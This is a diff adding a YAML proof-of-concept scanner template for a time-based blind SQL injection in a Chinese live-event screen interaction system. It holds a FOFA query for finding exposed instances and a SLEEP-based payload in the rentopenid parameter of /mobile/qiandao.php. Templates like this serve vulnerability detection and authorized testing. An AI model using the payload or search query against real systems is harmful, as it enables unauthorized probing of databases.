@@ -1,0 +1,22 @@
+id: poc-yaml-deejia-redpacket-php-sqli
+info:
+  name: 金华迪加现场大屏互动系统 redpacket.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 金华迪加现场大屏互动系统
+  fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg" || title="现场活动大屏幕系统"
+variables:
+  t1: random_int(2,5)
+  t2: t1 + t1
+  t3: t2 + 2
+requests:
+- method: GET
+  path: /frame.php
+  expression: status_code == 200 && ( contains(body,"/wall/themes/meepo/assets/images/defaultbg.jpg")
+    || contains(title,"现场活动大屏幕系统") )
+- method: GET
+  path: /mobile/qiandao.php?rentopenid=1%22%20AND%20(SELECT%203710%20FROM%20(SELECT(SLEEP({{.t1}})))eMwG)--%20yTBg
+  expression: status_code == 200 && contains(body,"恭喜你签到成功") && duration > t2 && duration
+    < t3
+transport: http
